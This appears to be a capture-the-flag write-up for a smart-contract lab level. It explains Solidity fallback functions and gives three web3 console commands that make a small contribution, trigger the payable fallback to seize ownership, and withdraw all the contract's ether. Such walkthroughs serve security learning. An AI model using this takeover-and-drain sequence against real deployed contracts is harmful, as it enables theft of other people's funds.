We want to : have at least 1 contribution, send ether to the fallback function in order to become the owner and finally withdraw everything !

Fallback function :
-   They are unnamed functions.
-   They cannot accept arguments.
-   They cannot return anything.
-   There can be only one fallback function in a smart contract.
-   It is compulsory to mark it external.
-   It should be marked as _payable_. If not, the contract will throw an exception if it receives ether without any data.
-   It is limited to 2300 gas if invoked by other functions.

1. First contribution < 0.001 ether : `contract.contribute.sendTransaction({from:player,to:instance , value:web3.utils.toWei('0.0005','ether')})`
2. Trigger the fallback function (sending directly to the contract) : `contract.sendTransaction({from:player,to:instance , value:web3.utils.toWei('0.0005','ether')})`
3. Withdraw the funds : `contract.withdraw()`